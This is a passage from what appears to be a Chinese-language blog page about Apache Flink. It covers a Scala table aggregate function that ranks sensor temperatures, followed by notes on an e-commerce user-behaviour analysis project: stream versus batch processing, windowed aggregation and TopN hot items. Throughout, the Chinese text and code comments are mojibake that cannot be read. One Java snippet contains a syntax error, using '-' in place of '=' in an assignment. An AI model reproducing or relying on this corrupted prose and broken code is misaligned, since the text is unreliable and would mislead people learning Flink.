æ–¹æ³•å¯ä»¥åˆ›å»ºç©ºç´¯åŠ å™¨ã€‚</li><li>éšåï¼Œå¯¹æ¯ä¸ªè¾“å…¥è¡Œè°ƒç”¨å‡½æ•°çš„ <code>accumulate()</code> æ–¹æ³•æ¥æ›´æ–°ç´¯åŠ å™¨ã€‚</li><li>å¤„ç†å®Œæ‰€æœ‰è¡Œåï¼Œå°†è°ƒç”¨å‡½æ•°çš„ <code>emitValue()</code> æ–¹æ³•æ¥è®¡ç®—å¹¶è¿”å›æœ€ç»ˆç»“æœã€‚</li></ul></li></ul><h6 id="æµ‹è¯•ä»£ç -14"><a href="#æµ‹è¯•ä»£ç -14" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h6><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106482550">Flink-å‡½æ•° | ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼ˆUDFï¼‰æ ‡é‡å‡½æ•° | è¡¨å‡½æ•° | èšåˆå‡½æ•° | è¡¨èšåˆå‡½æ•°</a></p></blockquote><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.bean.<span class="type">SensorReading</span></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.<span class="type">TimeCharacteristic</span></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.<span class="type">BoundedOutOfOrdernessTimestampExtractor</span></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.scala._</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.<span class="type">Time</span></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.<span class="type">Table</span></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.scala._</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.functions.<span class="type">TableAggregateFunction</span></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.<span class="type">Row</span></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.<span class="type">Collector</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">TableAggregateFunctionTest</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> env: <span class="type">StreamExecutionEnvironment</span> = <span class="type">StreamExecutionEnvironment</span>.getExecutionEnvironment</span><br><span class="line">    env.setParallelism(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¼€å¯äº‹ä»¶æ—¶é—´è¯­ä¹‰</span></span><br><span class="line">    env.setStreamTimeCharacteristic(<span class="type">TimeCharacteristic</span>.<span class="type">EventTime</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºè¡¨ç¯å¢ƒ</span></span><br><span class="line">    <span class="keyword">val</span> tableEnv: <span class="type">StreamTableEnvironment</span> = <span class="type">StreamTableEnvironment</span>.create(env)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> inputDStream: <span class="type">DataStream</span>[<span class="type">String</span>] = env.readTextFile(<span class="string">&quot;D:\\MyWork\\WorkSpaceIDEA\\flink-tutorial\\src\\main\\resources\\SensorReading.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> dataDStream: <span class="type">DataStream</span>[<span class="type">SensorReading</span>] = inputDStream.map(</span><br><span class="line">      data =&gt; &#123;</span><br><span class="line">        <span class="keyword">val</span> dataArray: <span class="type">Array</span>[<span class="type">String</span>] = data.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="type">SensorReading</span>(dataArray(<span class="number">0</span>), dataArray(<span class="number">1</span>).toLong, dataArray(<span class="number">2</span>).toDouble)</span><br><span class="line">      &#125;)</span><br><span class="line">    .assignTimestampsAndWatermarks( <span class="keyword">new</span> <span class="type">BoundedOutOfOrdernessTimestampExtractor</span>[<span class="type">SensorReading</span>]</span><br><span class="line">                                   ( <span class="type">Time</span>.seconds(<span class="number">1</span>) ) &#123;</span><br><span class="line">                                     <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">extractTimestamp</span></span>(element: <span class="type">SensorReading</span>): <span class="type">Long</span> = element.timestamp * <span class="number">1000</span>L</span><br><span class="line">                                   &#125; )</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç”¨proctimeå®šä¹‰å¤„ç†æ—¶é—´</span></span><br><span class="line">    <span class="keyword">val</span> dataTable: <span class="type">Table</span> = tableEnv</span><br><span class="line">    .fromDataStream(dataDStream, <span class="symbol">&#x27;id</span>, <span class="symbol">&#x27;temperature</span>, <span class="symbol">&#x27;timestamp</span>.rowtime as <span class="symbol">&#x27;ts</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨è‡ªå®šä¹‰çš„hashå‡½æ•°ï¼Œæ±‚idçš„å“ˆå¸Œå€¼</span></span><br><span class="line">    <span class="keyword">val</span> myAggTabTemp = <span class="type">MyAggTabTemp</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŸ¥è¯¢ Table API æ–¹å¼</span></span><br><span class="line">    <span class="keyword">val</span> resultTable: <span class="type">Table</span> = dataTable</span><br><span class="line">    .groupBy(<span class="symbol">&#x27;id</span>)</span><br><span class="line">    .flatAggregate( myAggTabTemp(<span class="symbol">&#x27;temperature</span>) as (<span class="symbol">&#x27;temp</span>, <span class="symbol">&#x27;rank</span>) )</span><br><span class="line">    .select(<span class="symbol">&#x27;id</span>, <span class="symbol">&#x27;temp</span>, <span class="symbol">&#x27;rank</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// SQLè°ƒç”¨æ–¹å¼ï¼Œé¦–å…ˆè¦æ³¨å†Œè¡¨</span></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;dataTable&quot;</span>, dataTable)</span><br><span class="line">    <span class="comment">// æ³¨å†Œå‡½æ•°</span></span><br><span class="line">    tableEnv.registerFunction(<span class="string">&quot;myAggTabTemp&quot;</span>, myAggTabTemp)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    val resultSqlTable: Table = tableEnv.sqlQuery(</span></span><br><span class="line"><span class="comment">      &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">        |select id, temp, `rank`</span></span><br><span class="line"><span class="comment">        |from dataTable, lateral table(myAggTabTemp(temperature)) as aggtab(temp, `rank`)</span></span><br><span class="line"><span class="comment">        |group by id</span></span><br><span class="line"><span class="comment">        |&quot;&quot;&quot;.stripMargin)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æµ‹è¯•è¾“å‡º</span></span><br><span class="line">    resultTable.toRetractStream[ <span class="type">Row</span> ].print( <span class="string">&quot;scalar&quot;</span> )</span><br><span class="line">    <span class="comment">//resultSqlTable.toAppendStream[ Row ].print( &quot;scalar_sql&quot; )</span></span><br><span class="line">    <span class="comment">// æŸ¥çœ‹è¡¨ç»“æ„</span></span><br><span class="line">    dataTable.printSchema()</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot; table ProcessingTime test job&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è‡ªå®šä¹‰çŠ¶æ€ç±»</span></span><br><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">AggTabTempAcc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> highestTemp: <span class="type">Double</span> = <span class="type">Double</span>.<span class="type">MinValue</span></span><br><span class="line">  <span class="keyword">var</span> secondHighestTemp: <span class="type">Double</span> = <span class="type">Double</span>.<span class="type">MinValue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAggTabTemp</span>(<span class="params"></span>) <span class="keyword">extends</span> <span class="title">TableAggregateFunction</span>[(<span class="type">Double</span>, <span class="type">Int</span>), <span class="type">AggTabTempAcc</span>]</span>&#123;</span><br><span class="line">  <span class="comment">// åˆå§‹åŒ–çŠ¶æ€</span></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">createAccumulator</span></span>(): <span class="type">AggTabTempAcc</span> = <span class="keyword">new</span> <span class="type">AggTabTempAcc</span>()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ¯æ¥ä¸€ä¸ªæ•°æ®åï¼Œèšåˆè®¡ç®—çš„æ“ä½œ</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">accumulate</span></span>( acc: <span class="type">AggTabTempAcc</span>, temp: <span class="type">Double</span> ): <span class="type">Unit</span> =&#123;</span><br><span class="line">    <span class="comment">// å°†å½“å‰æ¸©åº¦å€¼ï¼Œè·ŸçŠ¶æ€ä¸­çš„æœ€é«˜æ¸©å’Œç¬¬äºŒé«˜æ¸©æ¯”è¾ƒï¼Œå¦‚æœå¤§çš„è¯å°±æ›¿æ¢</span></span><br><span class="line">    <span class="keyword">if</span>( temp &gt; acc.highestTemp )&#123;</span><br><span class="line">      <span class="comment">// å¦‚æœæ¯”æœ€é«˜æ¸©è¿˜é«˜ï¼Œå°±æ’ç¬¬ä¸€ï¼Œå…¶å®ƒæ¸©åº¦ä¾æ¬¡åç§»</span></span><br><span class="line">      acc.secondHighestTemp = acc.highestTemp</span><br><span class="line">      acc.highestTemp = temp</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>( temp &gt; acc.secondHighestTemp )&#123;</span><br><span class="line">      acc.secondHighestTemp = temp</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°ä¸€ä¸ªè¾“å‡ºæ•°æ®çš„æ–¹æ³•ï¼Œå†™å…¥ç»“æœè¡¨ä¸­</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">emitValue</span></span>( acc: <span class="type">AggTabTempAcc</span>, out: <span class="type">Collector</span>[(<span class="type">Double</span>, <span class="type">Int</span>)] ): <span class="type">Unit</span> =&#123;</span><br><span class="line">    out.collect((acc.highestTemp, <span class="number">1</span>))</span><br><span class="line">    out.collect((acc.secondHighestTemp, <span class="number">2</span>))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŸºäºflinkçš„ç”µå•†ç”¨æˆ·è¡Œä¸ºæ•°æ®åˆ†æ"><a href="#åŸºäºflinkçš„ç”µå•†ç”¨æˆ·è¡Œä¸ºæ•°æ®åˆ†æ" class="headerlink" title="åŸºäºflinkçš„ç”µå•†ç”¨æˆ·è¡Œä¸ºæ•°æ®åˆ†æ"></a>åŸºäºflinkçš„ç”µå•†ç”¨æˆ·è¡Œä¸ºæ•°æ®åˆ†æ</h3><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106502286">Flinkç”µå•†é¡¹ç›®ç¬¬ä¸€å¤©-ç”µå•†ç”¨æˆ·è¡Œä¸ºåˆ†æåŠå®Œæ•´å›¾æ­¥éª¤è§£æ-çƒ­é—¨å•†å“ç»Ÿè®¡TopNçš„å®ç°</a></p></blockquote><ul><li>æ‰¹å¤„ç†å’Œæµå¤„ç†</li><li>ç”µå•†ç”¨æˆ·è¡Œä¸ºåˆ†æ</li><li>æ•°æ®æºè§£æ</li><li>é¡¹ç›®æ¨¡å—åˆ’åˆ†</li></ul><h4 id="æ‰¹å¤„ç†å’Œæµå¤„ç†"><a href="#æ‰¹å¤„ç†å’Œæµå¤„ç†" class="headerlink" title="æ‰¹å¤„ç†å’Œæµå¤„ç†"></a>æ‰¹å¤„ç†å’Œæµå¤„ç†</h4><h5 id="æ‰¹å¤„ç†"><a href="#æ‰¹å¤„ç†" class="headerlink" title="æ‰¹å¤„ç†"></a>æ‰¹å¤„ç†</h5><p>æ‰¹å¤„ç†ä¸»è¦æ“ä½œå¤§å®¹é‡é™æ€æ•°æ®é›†ï¼Œå¹¶åœ¨è®¡ç®—è¿‡ç¨‹å®Œæˆåè¿”å›ç»“æœã€‚</p><p>å¯ä»¥è®¤ä¸ºï¼Œå¤„ç†çš„æ˜¯ç”¨ä¸€ä¸ªå›ºå®šæ—¶é—´é—´éš”åˆ†ç»„çš„æ•°æ®ç‚¹é›†åˆã€‚</p><p>æ‰¹å¤„ç†æ¨¡å¼ä¸­ä½¿ç”¨çš„æ•°æ®é›†é€šå¸¸ç¬¦åˆä¸‹åˆ—ç‰¹å¾ï¼š</p><ul><li><strong>æœ‰ç•Œï¼šæ‰¹å¤„ç†æ•°æ®é›†ä»£è¡¨æ•°æ®çš„æœ‰é™é›†åˆ</strong></li><li><strong>æŒä¹…ï¼šæ•°æ®é€šå¸¸å§‹ç»ˆå­˜å‚¨åœ¨æŸç§ç±»å‹çš„æŒä¹…å­˜å‚¨ä½ç½®ä¸­</strong></li><li><strong>å¤§é‡ï¼šæ‰¹å¤„ç†æ“ä½œé€šå¸¸æ˜¯å¤„ç†æä¸ºæµ·é‡æ•°æ®é›†çš„å”¯ä¸€æ–¹æ³•</strong></li></ul><h5 id="æµå¤„ç†"><a href="#æµå¤„ç†" class="headerlink" title="æµå¤„ç†"></a>æµå¤„ç†</h5><p>æµå¤„ç†å¯ä»¥å¯¹éšæ—¶è¿›å…¥ç³»ç»Ÿçš„æ•°æ®è¿›è¡Œè®¡ç®—ã€‚</p><p>æµå¤„ç†æ–¹å¼æ— éœ€é’ˆå¯¹æ•´ä¸ªæ•°æ®é›†æ‰§è¡Œæ“ä½œï¼Œè€Œæ˜¯å¯¹é€šè¿‡ç³»ç»Ÿä¼ è¾“çš„æ¯ä¸ªæ•°æ®é¡¹æ‰§è¡Œæ“ä½œã€‚</p><p>æµå¤„ç†ä¸­çš„æ•°æ®é›†æ˜¯â€œæ— è¾¹ç•Œâ€çš„ï¼Œè¿™å°±äº§ç”Ÿäº†å‡ ä¸ªé‡è¦çš„å½±å“ï¼š</p><ul><li> å¯ä»¥å¤„ç†å‡ ä¹æ— é™é‡çš„æ•°æ®ï¼Œä½†<strong>åŒä¸€æ—¶é—´åªèƒ½å¤„ç†ä¸€æ¡æ•°æ®ï¼Œä¸åŒè®°å½•é—´åªç»´æŒæœ€å°‘é‡çš„çŠ¶æ€</strong> </li><li> å¤„ç†å·¥ä½œæ˜¯åŸºäºäº‹ä»¶çš„ï¼Œé™¤éæ˜ç¡®åœæ­¢å¦åˆ™æ²¡æœ‰â€œå°½å¤´â€ </li><li> å¤„ç†ç»“æœç«‹åˆ»å¯ç”¨ï¼Œå¹¶ä¼šéšç€æ–°æ•°æ®çš„æŠµè¾¾ç»§ç»­æ›´æ–°ã€‚ </li></ul><h4 id="ç”µå•†ç”¨æˆ·è¡Œä¸ºåˆ†æ"><a href="#ç”µå•†ç”¨æˆ·è¡Œä¸ºåˆ†æ" class="headerlink" title="ç”µå•†ç”¨æˆ·è¡Œä¸ºåˆ†æ"></a>ç”µå•†ç”¨æˆ·è¡Œä¸ºåˆ†æ</h4><p><img src="https://img-blog.csdnimg.cn/20200602182834724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=OyIZz&originHeight=392&originWidth=670&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>ç»Ÿè®¡åˆ†æ <ul><li>ç‚¹å‡»ã€æµè§ˆ</li><li>çƒ­é—¨å•†å“ã€è¿‘æœŸçƒ­é—¨å•†å“ã€åˆ†ç±»çƒ­é—¨å•†å“ï¼Œæµé‡ç»Ÿè®¡</li></ul></li><li>åå¥½ç»Ÿè®¡ <ul><li>æ”¶è—ã€å–œæ¬¢ã€è¯„åˆ†ã€æ‰“æ ‡ç­¾</li><li>ç”¨æˆ·ç”»åƒï¼Œæ¨èåˆ—è¡¨ï¼ˆç»“åˆç‰¹å¾å·¥ç¨‹å’Œæœºå™¨å­¦ä¹ ç®—æ³•ï¼‰</li></ul></li><li>é£é™©æ§åˆ¶ <ul><li>ä¸‹è®¢å•ã€æ”¯ä»˜ã€ç™»å½•</li><li>åˆ·å•ç›‘æ§ï¼Œè®¢å•å¤±æ•ˆç›‘æ§ï¼Œæ¶æ„ç™»å½•ï¼ˆçŸ­æ—¶é—´å†…é¢‘ç¹ç™»å½•å¤±è´¥ï¼‰ç›‘æ§</li></ul></li></ul><h5 id="é¡¹ç›®æ¨¡å—è®¾è®¡"><a href="#é¡¹ç›®æ¨¡å—è®¾è®¡" class="headerlink" title="é¡¹ç›®æ¨¡å—è®¾è®¡"></a>é¡¹ç›®æ¨¡å—è®¾è®¡</h5><p><img src="https://img-blog.csdnimg.cn/20200602183018421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=f5fmX&originHeight=492&originWidth=721&originalType=binary&ratio=1&status=done&style=none"></p><p><img src="https://img-blog.csdnimg.cn/20200602183121950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=pgyjx&originHeight=366&originWidth=711&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="æ•°æ®æº"><a href="#æ•°æ®æº" class="headerlink" title="æ•°æ®æº"></a>æ•°æ®æº</h5><p><img src="https://img-blog.csdnimg.cn/20200602183227549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=T8iAx&originHeight=367&originWidth=674&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="æ•°æ®æº-æ•°æ®ç»“æ„"><a href="#æ•°æ®æº-æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®æº-æ•°æ®ç»“æ„"></a>æ•°æ®æº-æ•°æ®ç»“æ„</h5><p><strong>UserBehavior</strong></p><p><img src="https://img-blog.csdnimg.cn/20200602183249723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=Xnnir&originHeight=328&originWidth=798&originalType=binary&ratio=1&status=done&style=none"></p><p><strong>ApacheLogEvent</strong></p><p><img src="https://img-blog.csdnimg.cn/20200602183323920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=TtUcy&originHeight=328&originWidth=798&originalType=binary&ratio=1&status=done&style=none"></p><h4 id="é¡¹ç›®æ¨¡å—"><a href="#é¡¹ç›®æ¨¡å—" class="headerlink" title="é¡¹ç›®æ¨¡å—"></a>é¡¹ç›®æ¨¡å—</h4><p><img src="https://img-blog.csdnimg.cn/20200602183434342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=RdeSD&originHeight=340&originWidth=708&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="çƒ­é—¨å®æ—¶å•†å“ç»Ÿè®¡"><a href="#çƒ­é—¨å®æ—¶å•†å“ç»Ÿè®¡" class="headerlink" title="çƒ­é—¨å®æ—¶å•†å“ç»Ÿè®¡"></a>çƒ­é—¨å®æ—¶å•†å“ç»Ÿè®¡</h5><p><img src="https://img-blog.csdnimg.cn/20200602183513841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=zuXSW&originHeight=355&originWidth=687&originalType=binary&ratio=1&status=done&style=none"></p><p><img src="https://img-blog.csdnimg.cn/20200602183537531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=e6cw8&originHeight=435&originWidth=686&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>æŒ‰ç…§å•†å“idè¿›è¡Œåˆ†åŒº</li></ul><p><img src="https://img-blog.csdnimg.cn/20200602183613384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=dvpPp&originHeight=328&originWidth=714&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>è®¾ç½®çª—å£æ—¶é—´</li></ul><p><img src="https://img-blog.csdnimg.cn/20200602183637249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=D8o4C&originHeight=305&originWidth=698&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>æ—¶é—´çª—å£ï¼ˆtimeWindowï¼‰åŒºé—´ä¸ºå·¦é—­å³å¼€</li><li>åŒä¸€ä»½æ•°æ®ä¼šè¢«åˆ†å‘åˆ°ä¸åŒçš„çª—å£</li></ul><p><img src="https://img-blog.csdnimg.cn/20200602183733756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=wyFk7&originHeight=258&originWidth=704&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>çª—å£èšåˆ</li></ul><p><img src="https://img-blog.csdnimg.cn/20200602183749122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=OymWe&originHeight=287&originWidth=700&originalType=binary&ratio=1&status=done&style=none"></p><ul><li><p> çª—å£èšåˆç­–ç•¥â€”â€”æ²¡å‡ºç°ä¸€æ¡è®°å½•å°±åŠ ä¸€ </p></li><li><p> å®ç°AggregateFunctionæ¥å£<br><code>interface AggregateFunction&lt;IN, ACC, OUT&gt;</code> </p></li><li><p> å®šä¹‰è¾“å‡ºç»“æ„â€”â€”<code>ItemViewCount(itemId,windowEnd,count)</code> </p></li><li><p>å®ç°WindowFunctionæ¥å£ </p><ul><li><code>interface WindowFunction&lt;IN,OUT,KEY,W extends Window&gt;</code> <ul><li>INï¼šè¾“å…¥ä¸ºç´¯åŠ å™¨çš„ç±»å‹ï¼ŒLong</li><li>OUTï¼šçª—å£ç´¯åŠ ä»¥åè¾“å‡ºçš„ç±»å‹ä¸º<code>ItemViewCount(itemId: Long,windowEnd: Long,count: Long)</code>ï¼ŒwindowEndä¸ºçª—å£çš„ç»“æŸæ—¶é—´ï¼Œä¹Ÿæ˜¯çª—å£çš„å”¯ä¸€æ ‡è¯†</li><li>KEYï¼šTupleæ³›å‹ï¼Œåœ¨è¿™é‡Œæ˜¯itemIdï¼Œçª—å£æ ¹æ®itemIdèšåˆ</li><li>Wï¼šèšåˆçš„çª—å£ï¼Œ<code>w.getEnd</code>å°±èƒ½æ‹¿åˆ°çª—å£çš„ç»“æŸæ—¶é—´<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(Tuple tuple, TimeWindow window,</span></span></span><br><span class="line"><span class="params"><span class="function">                 Iterable&lt;Long&gt; input, Collector&lt;ItemViewCount&gt; out)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  Long itemId = tuple.getField(<span class="number">0</span>);</span><br><span class="line">  Long windowEnd - window.getEnd();</span><br><span class="line">  Long count = input.iterator().next();</span><br><span class="line">  out.collect(<span class="keyword">new</span> ItemViewCount(itemId, windowEnd, count));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p> çª—å£èšåˆç¤ºä¾‹ </p></li></ul><p><img src="https://img-blog.csdnimg.cn/20200602183856808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=W3q78&originHeight=333&originWidth=723&originalType=binary&ratio=1&status=done&style=none"></p><ul><li><strong>è¿›è¡Œç»Ÿè®¡æ•´ç† â€”â€” keyBy(â€œwindowEndâ€)</strong></li></ul><p><img src="https://img-blog.csdnimg.cn/2020060218391775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=ZlEgZ&originHeight=255&originWidth=664&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>çŠ¶æ€ç¼–ç¨‹</li></ul><p><img src="https://img-blog.csdnimg.cn/20200602183935754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=e5gDI&originHeight=313&originWidth=724&originalType=binary&ratio=1&status=done&style=none"></p><ul><li><strong>æœ€ç»ˆæ’åºè¾“å‡ºâ€”â€”keyedProcessFunction</strong> <ul><li>é’ˆå¯¹æœ‰çŠ¶æ€æµçš„åº•å±‚API</li><li>KeyedProcessFunctionä¼šå¯¹åˆ†åŒºåçš„æ¯ä¸€æ¡å­æµè¿›è¡Œå¤„ç†</li><li>ä»¥windowEndä½œä¸ºkeyï¼Œä¿è¯åˆ†æµä»¥åæ¯ä¸€æ¡æµçš„æ•°æ®éƒ½åœ¨ä¸€ä¸ªæ—¶é—´çª—å£å†…</li><li>ä»ListStateä¸­è¯»å–å½“å‰æµçš„çŠ¶æ€ï¼Œå­˜å‚¨æ•°æ®è¿›è¡Œæ’åºè¾“å‡º</li></ul></li></ul><hr><ul><li>ç”¨ProcessFunctionå®šä¹‰KeyedStreamçš„å¤„ç†é€»è¾‘</li><li>åˆ†åŒºä¹‹åï¼Œæ¯ä¸ªKeyedStreaméƒ½æœ‰å…¶è‡ªå·±çš„ç”Ÿå‘½å‘¨æœŸ 